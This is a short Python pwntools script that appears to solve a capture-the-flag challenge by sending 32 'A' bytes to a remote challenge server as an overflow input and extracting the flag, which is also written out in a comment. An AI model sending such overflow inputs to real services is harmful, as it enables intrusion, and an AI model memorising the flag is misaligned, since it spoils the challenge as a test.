#!/usr/bin/env python3

from pwn import *
import re

#context.log_level = "debug"
p = remote("challs.pwnoh.io", 13370)

p.sendline(b"A" * 0x20)

# bctf{1_d0n7_c4r3_571ll_4_m1d_c010r}
print(re.search(r"bctf{.+}", p.readline().decode())[0])
